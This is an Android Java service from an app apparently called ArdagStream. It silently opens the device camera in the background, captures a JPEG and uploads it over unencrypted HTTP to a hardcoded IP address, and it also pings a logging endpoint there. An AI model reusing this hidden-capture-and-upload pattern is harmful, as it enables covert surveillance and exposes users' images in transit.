package in.ardagro.ardagstream;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CaptureResult;
import android.hardware.camera2.TotalCaptureResult;
import android.icu.text.SimpleDateFormat;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.util.Log;
import android.util.Range;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import org.jetbrains.annotations.NotNull;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Date;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class UploadCamshotService extends Service {
    private Looper looper;
    private ServiceHandler handler;
    CameraCaptureSession session;
    ImageReader imageReader;
    CameraDevice cameraDevice;


    private final class ServiceHandler extends Handler {
        CameraDevice.StateCallback cameraStateback = new CameraDevice.StateCallback() {
            @Override
            public void onOpened(@NonNull CameraDevice camera) {
                cameraDevice = camera;
                handleCamReady();
            }

            @Override
            public void onDisconnected(@NonNull CameraDevice camera) {

            }

            @Override
            public void onError(@NonNull CameraDevice camera, int error) {

            }
        };

        CameraCaptureSession.StateCallback sessionStateCallback = new CameraCaptureSession.StateCallback() {
            @Override
            public void onReady(@NonNull CameraCaptureSession session) {

            }

            @Override
            public void onConfigured(@NonNull CameraCaptureSession session) {
                UploadCamshotService.this.session = session;
                try {
                    session.capture(createCaptureRequest(),null,null);
                } catch (CameraAccessException e) {
                    e.printStackTrace();
                }
            }



            @Override
            public void onConfigureFailed(@NonNull CameraCaptureSession session) {

            }
        };
        ImageReader.OnImageAvailableListener onImageAvailableListener = new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                Image image = reader.acquireLatestImage();
                Log.i("CAMERA","AquiredImage");
                processImage(image);
                image.close();
              //  session.close();

            }
        };

        public ServiceHandler(Looper looper) {
            super(looper);
        }

        @Override
        public void handleMessage(Message msg) {
            Log.i("ArdagStream", "INHANDLER-------------------------------------------------------");
            writeToFile("*"+new SimpleDateFormat("dd-MM-yyyy hh:mm").format(new Date()),UploadCamshotService.this.getApplicationContext());
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (ActivityCompat.checkSelfPermission(UploadCamshotService.this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            try {
                Log.i("CAMERA","OPENING CAMERA");
                for(String camId : manager.getCameraIdList()){
                    Log.i("CAMERA","#####CAMID "+camId);
                }
                manager.openCamera("0", cameraStateback, null);
                imageReader = ImageReader.newInstance(1920,1088, ImageFormat.JPEG,2);
                imageReader.setOnImageAvailableListener(onImageAvailableListener,null);
                
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }
        private void handleCamReady(){
            try {
                cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()),sessionStateCallback,null);
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }
    }

    private CaptureRequest createCaptureRequest() {
        Log.i("CAPTURE REQUEST","------------IN CREATE CAPTURE REQUEST----------------");
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(cameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
            builder.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE,getRange());
            builder.addTarget(imageReader.getSurface());
            return builder.build();
        } catch (CameraAccessException e) {
            e.printStackTrace();
            return null;
        }
    }

    private void processImage(Image image){
        Log.i("CAMERA","HERE===>"+image);
        ByteBuffer imageBuffer = image.getPlanes()[0].getBuffer();
        byte[] imageBytes = new byte[imageBuffer.remaining()];
        imageBuffer.get(imageBytes);
       // Bitmap bitmapIm = BitmapFactory.decodeByteArray(imageBytes,0,imageBytes.length,null);
      //  ByteArrayOutputStream stream = new ByteArrayOutputStream();
       // bitmapIm.compress(Bitmap.CompressFormat.JPEG,100,stream);
       // byte[] byteArray = stream.toByteArray();
        OkHttpClient client = new OkHttpClient.Builder().build();
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("uploadfile","random",
                RequestBody.create(MediaType.parse("image/*"),imageBytes)).addFormDataPart("test","test").build();
        Request request = new Request.Builder().url("http://35.193.130.169/ArdagStrem/stream/upload").post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {

            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                Log.i("UPLOAD",""+response.isSuccessful());
            }
        });

/*
        final String boundary = "*************9860117760**************";
        final String lineEnd = "\r\n";
        try {
            URL url = new URL("http://35.193.130.169/ArdagStrem/stream/upload");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type","multipart/form-data; boundary="+boundary);
            connection.setRequestMethod("POST");

            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--"+boundary+lineEnd);
            outputStream.writeBytes("Content-Desposition: form-data; name=\"param\"; filename=\"rendom\""+lineEnd);
            outputStream.writeBytes("Content-Type: image/jpeg"+lineEnd);
            outputStream.writeBytes("Content-Transfer-Encoding: binary"+lineEnd);
            outputStream.writeBytes(lineEnd);
            for(byte b : imageBytes){
                outputStream.write(b);
            }
            outputStream.writeBytes(lineEnd);

            outputStream.writeBytes("--"+boundary+lineEnd);
            outputStream.writeBytes("Content-Deposition: form-data; name=\"upf\""+lineEnd);
            outputStream.writeBytes("Content-Type: text/plain"+lineEnd);
            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes("Prashant");
            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes("--"+boundary+"--"+lineEnd);
            outputStream.flush();
            outputStream.close();


            int serverrespcode = connection.getResponseCode();
            if(serverrespcode == 200){
                InputStream is = new BufferedInputStream(connection.getInputStream());
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                String inputline;
                while ((inputline = br.readLine()) != null){
                    Log.i("GOOGLE","GoogleResponse==>"+inputline);
                }
            } else {
                Log.i("GOOGLE","Error GoogleResponse==>"+serverrespcode);
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
*/
    }

    public UploadCamshotService() {
    }

    @Override
    public void onCreate() {
        Log.i("ArdagStream","Reaching-------------------------------------------------------");
        HandlerThread thread = new HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_BACKGROUND);
        thread.start();
        looper = thread.getLooper();
        handler = new ServiceHandler(looper);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Message msg = handler.obtainMessage();
        msg.arg1 = startId;
        handler.sendMessage(msg);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        try {
            session.abortCaptures();
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
        session.close();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
    }

    private void writeToFile(String data, Context context) {
            OkHttpClient client = new OkHttpClient.Builder().build();

            Request request = new Request.Builder().url("http://35.193.130.169/ArdagStrem/stream/logrequest").build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(@NotNull Call call, @NotNull IOException e) {
                }
                @Override
                public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                    Log.i("LOGREQUEST",""+response.isSuccessful());
                }
            });
        }

    private Range<Integer> getRange() {
        CameraCharacteristics chars = null;
        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            chars = manager.getCameraCharacteristics("0");
            Range<Integer>[] ranges = chars.get(CameraCharacteristics.CONTROL_AE_AVAILABLE_TARGET_FPS_RANGES);
            Range<Integer> result = null;
            for (Range<Integer> range : ranges) {
                int upper = range.getUpper();
                // 10 - min range upper for my needs
                if (upper >= 10) {
                    if (result == null || upper < result.getUpper().intValue()) {
                        result = range;
                    }
                }
                Log.e("Avaliable frame fps :",""+range);
            }
            if (result == null) {
                result = ranges[0];
            }

            Log.e("frame fps :",""+result);
            return result;
        } catch (CameraAccessException e) {
            e.printStackTrace();
            return null;
        }
    }
}
